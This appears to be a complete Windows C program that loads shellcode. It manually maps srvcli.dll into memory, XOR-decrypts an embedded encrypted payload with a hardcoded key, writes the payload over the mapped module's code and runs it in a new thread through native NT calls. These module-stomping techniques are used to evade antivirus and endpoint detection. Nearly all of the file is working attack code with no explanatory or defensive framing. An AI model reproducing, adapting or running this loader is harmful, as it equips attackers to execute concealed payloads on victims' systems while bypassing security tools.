#include <Windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <winternl.h>  
#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "ntdll.lib")   // 确保 ntdll.lib 链接

#define NtCurrentProcess() ((HANDLE)-1)
#define DEFAULT_BUFLEN 4096
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

WCHAR* slib = (WCHAR*)L"C:\\Windows\\system32\\srvcli.dll";

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);
EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
);
EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);
EXTERN_C NTSTATUS NtWaitForSingleObject(
    IN HANDLE Handle,
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER Timeout
);
void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES,
        CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode,
        &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }
    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
}
PVOID ManualMapDLL(LPCWSTR dllPath) {
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* peBuffer = (BYTE*)malloc(fileSize);
    if (!peBuffer) {
        CloseHandle(hFile);
        return NULL;
    }
    DWORD bytesRead;
    ReadFile(hFile, peBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peBuffer;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        free(peBuffer);
        return NULL;
    }
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(peBuffer + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        free(peBuffer);
        return NULL;
    }

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    PVOID baseAddr = VirtualAlloc((PVOID)nt->OptionalHeader.ImageBase, imageSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!baseAddr) {
        baseAddr = VirtualAlloc(NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (!baseAddr) {
            free(peBuffer);
            return NULL;
        }
    }
    memcpy(baseAddr, peBuffer, nt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        memcpy((BYTE*)baseAddr + section[i].VirtualAddress,
            peBuffer + section[i].PointerToRawData,
            section[i].SizeOfRawData);
    }
    ULONG_PTR delta = (ULONG_PTR)baseAddr - nt->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)baseAddr + relocDir.VirtualAddress);
            while (reloc->VirtualAddress != 0 && reloc->SizeOfBlock != 0) {
                DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD j = 0; j < numEntries; j++) {
                    WORD type = entries[j] >> 12;
                    WORD offset = entries[j] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) { // x64
                        ULONG_PTR* address = (ULONG_PTR*)((BYTE*)baseAddr + reloc->VirtualAddress + offset);
                        *address += delta;
                    }
                    else if (type == IMAGE_REL_BASED_HIGHLOW) { // x86
                        DWORD* address = (DWORD*)((BYTE*)baseAddr + reloc->VirtualAddress + offset);
                        *address += (DWORD)delta;
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }
    }
    IMAGE_DATA_DIRECTORY importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)baseAddr + importDir.VirtualAddress);
        while (importDesc->Name) {
            char* dllName = (char*)((BYTE*)baseAddr + importDesc->Name);
            HMODULE hDll = GetModuleHandleA(dllName);
            if (!hDll) {
                hDll = LoadLibraryA(dllName);
            }
            if (!hDll) {
                importDesc++;
                continue;
            }
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)baseAddr + importDesc->FirstThunk);
            PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((BYTE*)baseAddr +
                (importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk));
            while (origThunk->u1.AddressOfData) {
                FARPROC funcAddr = NULL;
                if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    funcAddr = GetProcAddress(hDll, (LPCSTR)(origThunk->u1.Ordinal & 0xFFFF));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)baseAddr + origThunk->u1.AddressOfData);
                    funcAddr = GetProcAddress(hDll, importByName->Name);
                }
                if (funcAddr) {
                    thunk->u1.Function = (ULONG_PTR)funcAddr;
                }
                thunk++;
                origThunk++;
            }
            importDesc++;
        }
    }

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD protect = 0;
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            protect = PAGE_EXECUTE_READ;
            if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE)
                protect = PAGE_EXECUTE_READWRITE;
        }
        else if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            protect = PAGE_READWRITE;
        }
        else {
            protect = PAGE_READONLY;
        }
        DWORD old;
        VirtualProtect((BYTE*)baseAddr + section[i].VirtualAddress,
            section[i].Misc.VirtualSize, protect, &old);
    }
    FlushInstructionCache(GetCurrentProcess(), baseAddr, imageSize);

    free(peBuffer);
    return baseAddr;
}

int main(int argc, char** argv) {
    char encryptedShellcode[] = {
    0x79, 0xB3, 0x84, 0x65, 0x6F, 0x72, 0x79, 0x54, 0x7A, 0xB9, 0x36, 0x16, 0x54, 0x35, 0x3F, 0x3F,
    0x7E, 0xEA, 0x21, 0x33, 0x65, 0xB6, 0x7D, 0x70, 0x29, 0xF8, 0x14, 0x21, 0x7A, 0xE3, 0x3D, 0x2E,
    0x3A, 0xF2, 0x31, 0xB3, 0x49, 0x3E, 0x00, 0x34, 0x07, 0x3F, 0x4A, 0xDA, 0x29, 0xEA, 0xE5, 0x65,
    0xFA, 0xFF, 0x72, 0x15, 0xE2, 0x68, 0xD9, 0xF2, 0x68, 0x65, 0x6E, 0x3E, 0xF2, 0xC1, 0x7A, 0xF5,
    0xF1, 0x5F, 0x58, 0x35, 0x3F, 0x6C, 0x7E, 0xDA, 0x14, 0x58, 0x48, 0x4F, 0x0E, 0x72, 0x4F, 0x17,
    0x37, 0x79, 0xB9, 0xA4, 0x2D, 0xED, 0x9E, 0x61, 0x70, 0xCD, 0xE4, 0x7A, 0xB8, 0xEC, 0x7D, 0xB4,
    0xF4, 0x7E, 0xA6, 0xA3, 0x41, 0x27, 0x05, 0x23, 0xA8, 0xEF, 0x73, 0x64, 0x31, 0x7E, 0xE3, 0x95,
    0x23, 0x41, 0xB0, 0x7C, 0x01, 0xF2, 0x7A, 0x00, 0xE6, 0x7D, 0x0C, 0xF6, 0x77, 0x9E, 0xB7, 0x63,
    0xA6, 0xF3, 0x75, 0x87, 0xA3, 0x22, 0x4B, 0x93, 0x33, 0x80, 0x08, 0x6E, 0x72, 0x79, 0x7D, 0xB9,
    0xC2, 0x7A, 0x00, 0xF4, 0x65, 0x77, 0x87, 0x55, 0x00, 0x0D, 0x48, 0x03, 0x58, 0x45, 0x25, 0x31,
    0x3B, 0xEF, 0xFD, 0x7A, 0xEB, 0x89, 0x4E, 0x3A, 0xBE, 0xF3, 0x33, 0x32, 0x32, 0x33, 0x75, 0xCA,
    0xE9, 0x77, 0xBD, 0xAF, 0x29, 0x91, 0xA8, 0xE2, 0x92, 0xFB, 0x61, 0x73, 0x64, 0x31, 0xDA, 0x50,
    0x65, 0x6E, 0x72, 0x35, 0xBA, 0xC2, 0x7A, 0xF5, 0xF3, 0x55, 0x51, 0x3F, 0x3F, 0x66, 0x29, 0xD9,
    0x6E, 0x55, 0x54, 0x49, 0x14, 0x09, 0x01, 0x01, 0x61, 0x7A, 0xE3, 0xAB, 0x26, 0xF9, 0xAD, 0x79,
    0xB1, 0xDE, 0x12, 0x72, 0xCB, 0xE3, 0x73, 0xB4, 0xC6, 0x29, 0xE0, 0xEF, 0xA5, 0x3C, 0x3D, 0x40,
    0x29, 0xF0, 0x88, 0x29, 0x7A, 0x5B, 0xAC, 0x2F, 0x8D, 0xAF, 0xF2, 0x7A, 0xB1, 0xDE, 0x73, 0x62,
    0x7D, 0xB4, 0xC5, 0x7E, 0xEA, 0xB8, 0x63, 0xA6, 0x4E, 0x01, 0x08, 0xEA, 0xB5, 0x2C, 0xF0, 0xD2,
    0x5E, 0x2D, 0xAF, 0x9A, 0x4F, 0x79, 0xB9, 0x86, 0x31, 0xBB, 0x34, 0x35, 0x3F, 0x77, 0xF7, 0x87,
    0x41, 0x63, 0xEC, 0xD3, 0x1D, 0x08, 0x62, 0x80, 0x32, 0xBA, 0x44, 0x48, 0x2D, 0x6D, 0x81, 0x31,
    0x02, 0xFB, 0xCD, 0xFB, 0xCC, 0xF5, 0x98, 0x77, 0x3C, 0xF5, 0x52, 0xB3, 0xAB, 0x15, 0x3D, 0x49,
    0x4F, 0xA0, 0xB9, 0x63, 0x60, 0x3D, 0xD6, 0x6D, 0x6D, 0xA3, 0x20, 0x79, 0xCD, 0xF2, 0xD9, 0xDF,
    0x0F, 0xE2, 0x4A, 0xDF, 0x68, 0xEA, 0x37, 0x0F, 0x65, 0x3E, 0xEE, 0x4F, 0xDE, 0x7F, 0x2E, 0xBA,
    0x64, 0x74, 0x2D, 0x6D, 0xA1, 0xF2, 0x35, 0xB8, 0x7A, 0x31, 0xF0, 0x6A, 0x7D, 0xBC, 0xFB, 0x76,
    0xA2
    };   
    char key[] = "12henry1222345??6aa+-==@asd";

    DWORD payload_length = sizeof(encryptedShellcode);
    PVOID BaseAddress = NULL;
    SIZE_T dwSize = 0x2000;
    HMODULE addr;

    
    addr = (HMODULE)ManualMapDLL(slib);
    if (!addr) {
        printf("[!] Manual mapping of %ls failed\n", slib);
        return 1;
    }
    
    BaseAddress = (PBYTE)addr + 0x1000 * 2 + 0xf; // 2kb + f
    printf("Manual mapped base: %p, target address: %p\n", addr, BaseAddress);

    // 解密 shellcode（XOR 方式，保留原逻辑）
    unsigned char shellcode[sizeof encryptedShellcode];
    int keylength = strlen(key);
    for (int i = 0; i < sizeof encryptedShellcode; i++) {
        shellcode[i] = encryptedShellcode[i] ^ key[i % keylength];
        printf("%02X", shellcode[i]);
    }
    printf("\n");

    DWORD OldProtect = 0;
    NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize,
        PAGE_READWRITE, &OldProtect);
    RtlMoveMemory(BaseAddress, shellcode, sizeof(shellcode));
    NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize,
        OldProtect, &OldProtect);

    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hHostThread, 0x1FFFFF,
        NULL, NtCurrentProcess(),
        (LPTHREAD_START_ROUTINE)BaseAddress,
        NULL, FALSE, NULL, NULL, NULL, NULL);
    getchar();  
    if (!NT_SUCCESS(NtCreateThreadstatus)) {
        printf("[!] Failed in sysNtCreateThreadEx (%u)\n", GetLastError());
        return 3;
    }

    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, NULL);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in sysNtWaitForSingleObject (%u)\n", GetLastError());
        return 4;
    }
    return 0;
}
